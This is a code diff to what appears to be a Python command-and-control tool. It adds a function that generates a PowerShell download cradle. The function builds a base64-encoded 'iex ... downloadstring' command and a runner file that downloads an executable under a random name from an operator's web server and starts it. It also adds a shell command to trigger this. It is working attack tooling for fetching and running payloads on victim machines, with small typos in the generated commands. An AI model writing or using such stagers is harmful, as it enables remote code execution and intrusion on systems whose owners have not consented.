@@ -10,6 +10,7 @@ import os
 import os.path
 import shutil
 import subprocess
+import base64
 
 def banner():
     print("   ___            _ _         ___ ____  _ \n  / _ \__ _  __ _| (_) __ _  / __\___ \(_)\n / /_)/ _` |/ _` | | |/ _` |/ /    __) | |\n/ ___/ (_| | (_| | | | (_| / /___ / __/| |\n\/    \__,_|\__, |_|_|\__,_\____/|_____|_|\n            |___/                         \n")
@@ -213,6 +214,28 @@ def comm_handler():
         except:
             pass
 
+def pshell_cradle():
+    webserver_ip = input("[+] Web server listening host: ")
+    webserver_port = input("[+] Webserver listening port: ")
+    payload_name = input("[+] Payload name: ")
+    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    runner_file = f'{runner_file}.txt'
+    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    randomized_exe_file = f"{randomized_exe_file}.exe"
+    print(f'[+] Run the following command to start a web server.\n python3 -m http.server -b {webserver_ip}{webserver_port}')
+
+    runner_cal_unencoded = f"iex (new-objectnet.webclient.downloadstring('http://{webserver_ip}:{webserver_port}/{runner_file}'))".encode('utf-16le')
+    with open(runner_file, "w") as f:
+        f.write(f"powershell -c wget http://{webserver_ip}:{webserver_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}")
+        f.close()
+    
+    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
+    b64_runner_cal = b64_runner_cal.decode()
+    print(f"\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}")
+    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
+    print(f"\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}")
+
+
 
 if __name__ == "__main__":
     targets = []
@@ -224,6 +247,9 @@ if __name__ == "__main__":
     while True:
         try:
             command = input("#> ")
+
+            if command == "pshell_shell":
+                pshell_cradle()
 
             if command == "listeners -g":
                 host_ip = input("[*] Enter IP to listen on: ")
